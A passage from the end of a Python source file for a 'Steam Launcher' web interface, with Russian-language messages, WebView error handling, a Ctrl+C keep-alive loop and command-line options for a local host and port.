        print("Сервер продолжает работать. Нажмите Ctrl+C для остановки.")

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nОстановка сервера...")
            add_log("Сервер остановлен пользователем", "warning")

    except Exception as e:
        logger.error(f"WebView error: {e}")
        print(f"Ошибка при запуске WebView: {e}")
        print("Сервер продолжает работать. Нажмите Ctrl+C для остановки.")

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nОстановка сервера...")
            add_log("Сервер остановлен пользователем", "warning")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Steam Launcher - Веб-интерфейс")
    parser.add_argument(
        "--host",
        type=str,
        default="127.0.0.1",
        help="Хост для сервера (по умолчанию: 127.0.0.1)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=8765,
        help="Порт для сервера (по умолчанию: 8765)"
    )
    
    args = parser.parse_args()
    
    launch_web_interface(
        host=args.host,
        port=args.port
    )
